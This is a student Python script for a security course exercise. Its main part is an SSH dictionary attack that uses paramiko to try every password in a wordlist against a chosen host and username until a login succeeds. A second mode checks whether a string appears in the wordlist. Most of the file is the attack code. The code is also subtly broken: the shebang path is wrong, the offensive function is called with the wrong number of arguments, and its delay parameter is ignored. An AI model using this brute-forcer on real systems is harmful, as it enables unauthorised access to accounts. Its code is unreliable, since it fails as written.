#!/bin/usr/python3

# Script Name:                      401 ops challenge 17
# Author:                           Ethan Pham
# Date of latest revision:          May 21, 2024
# Purpose:                          Add the capability to attempt each word in word list until success 

import time
import paramiko

def offensive_mode(file_path, delay, ip_address, username):
    try:
        with open(file_path, 'r') as file:
            words = file.readlines()

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for word in words:
            password = word.strip()
            print(f"Trying {password}")
            try:
                ssh.connect(ip_address, username=username, password=password)
                print("Login successful")
                return True
            except paramiko.AuthenticationException:
                print("Login failed")
                time.sleep(1)

        print("Password not found")
        return False
    except FileNotFoundError:
        print("The file was not found")

def defensive_mode(file_path, search_string):
    try:
        with open(file_path, 'r') as file:
            words = file.readlines()
        found = any(word.strip() == search_string for word in words)
        if found:
            print(f"'{search_string}' was found")
        else:
            print(f"'{search_string}' was not found")
    except FileNotFoundError:
        print("The file was not found")

def main():
    while True:
        print("Choose a mode:")
        print("1: Offensive; Dictionary Iterator")
        print("2: Defensive; Password Recognized")
        mode = input("Enter mode number: ")

        if mode == '1':
            file_path = input("Enter word list file path: ")
            ip_address = input("IP address: ")
            username = input("Username: ")
            offensive_mode(file_path, ip_address, username)
        elif mode == '2':
            search_string = input("Enter string to search: ")
            file_path = input("Enter word list file path: ")
            defensive_mode(file_path, search_string)
        
        break

if __name__ == "__main__":
    main()